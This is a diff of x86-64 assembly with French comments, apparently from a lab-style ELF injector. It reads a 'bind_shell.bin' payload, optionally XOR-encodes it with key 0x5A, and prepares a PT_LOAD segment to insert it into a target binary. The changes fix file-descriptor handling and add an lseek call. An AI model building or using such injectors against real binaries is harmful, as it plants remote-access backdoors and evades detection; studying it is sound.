@@ -3,8 +3,6 @@ section .data
 	nomelf db "simple", 0
 	payload_name db "bind_shell.bin", 0
 
-	input_bin db "bind_shell.bin",0
-    output_bin db "bind_shell_xor.bin",0
     xor_key equ 0x5A
 section .bss
 	elfheader resb 64
@@ -247,23 +245,22 @@ fin_recherche:
 	cmp rax, 2
 	jbe erreur
 
-	mov r14, rax
 	mov r9, rax
 	
-	cmp byte [r15], '0'
-	jne not_xor
+	cmp byte [r15], '0'  		; 0 on ne convertit pas en xor 1 on convertit en xor
+	je not_xor
 
 read_loop:
 
     mov     rax, 0              
-    mov     rdi, r14           
+    mov     rdi, r9           
     mov     rsi, buffer
-    mov     rdx, 4096       ; lecture du shell
+    mov     rdx, 4096       ; Lecture du shell
     syscall
 
     cmp rax, 0
     jl erreur
-    jz not_xor        Si vide quitter
+    jz not_xor        ; Si vide quitter
 
     mov r14, rax 
 
@@ -295,9 +292,17 @@ xor_loop:
 
 not_xor:
 
+	mov rax, 8       
+	mov rdi, r9      
+	mov rsi, 0       
+	mov rdx, 0       
+	syscall 			; Revient au debut du fichier
+
+	cmp rax, 0
+    jl erreur           ; Vérifie si lseek a échoué
 
 	mov rax, 0
-	mov rdi, r14
+	mov rdi, r9
 	mov rsi, payload_buffer
 	mov rdx, 4096
 	syscall 		; Lit le payload pour compter le nombre d'octet
@@ -308,7 +313,7 @@ not_xor:
 	mov [payload_size], rax
 
 	mov rax, 3
-	mov rdi, r14
+	mov rdi, r9
 	syscall 		;ferme l'ouverture du payload
 
 preparation_PT_LOAD:
